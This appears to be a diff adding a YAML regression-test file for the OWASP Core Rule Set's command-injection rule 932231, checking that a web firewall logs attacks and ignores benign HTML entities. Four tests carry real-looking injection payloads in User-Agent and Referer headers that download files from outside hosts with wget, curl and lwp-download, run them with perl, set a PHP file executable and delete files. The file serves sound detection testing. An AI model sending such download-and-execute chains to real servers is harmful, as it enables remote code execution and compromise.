@@ -1,0 +1,128 @@
+---
+meta:
+  author: Max Leske
+  description: "Old tests and tests for fix of 932231 rule triggered with html decimal entities because of using legacy ISO-8859 charsets family - https://github.com/coreruleset/coreruleset/issues/1886. \nIf you need to trigger tests on a command, use one of the three letter commands in the file included by the 932231 data rule.\n"
+  enabled: true
+  name: 932231.yaml
+tests:
+  - test_title: 932231-1
+    desc: System Command Injection (932231) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932231"
+  - test_title: 932231-2
+    desc: System Command Injection (932231) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932231"
+  - test_title: 932231-3
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932231"
+  - test_title: 932231-4
+    desc: System Command Injection (932231) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932231"
+  - test_title: 932231-5
+    desc: System Command Injection (932231) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932231"
+  - test_title: 932231-6
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932231"
